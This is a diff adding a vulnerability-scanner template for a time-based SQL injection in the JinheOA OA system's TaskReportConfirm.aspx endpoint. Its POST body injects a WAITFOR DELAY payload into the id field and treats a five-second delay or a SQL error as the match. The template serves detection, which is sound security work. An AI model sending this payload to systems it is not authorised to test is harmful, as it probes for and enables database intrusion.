@@ -1,0 +1,31 @@
+id: jhsoft-taskreportconfirm-sqlinjection
+
+info:
+  name: JinheOA TaskReportConfirm.aspx SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Detects time-based SQL injection vulnerability in JinheOA TaskReportConfirm.aspx endpoint
+    by measuring response time difference when injecting a delay payload.
+  tags: sqlinjection,time-based,oasystem,jinheoa
+
+http:
+  - method: POST
+    path:
+      - "/c6/Jhsoft.Web.dailytaskmanage/TaskReportConfirm.aspx/"
+    headers:
+      Content-Type: application/x-www-form-urlencoded
+    body: |
+      __EVENTTARGET=xxxx&__EVENTARGUMENT=&__VIEWSTATE=xxxx&txtTaskReportExplain=&chkCallViewers=on&hidReportID=0&__VIEWSTATEGENERATOR=xxxxx&id='WAITFOR DELAY '0:0:5'--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: dsl
+        dsl:
+          - elapsed >= 5000
+      - type: regex
+        part: body
+        regex:
+          - "(?i)(SQL Server|ODBC|Syntax error)"
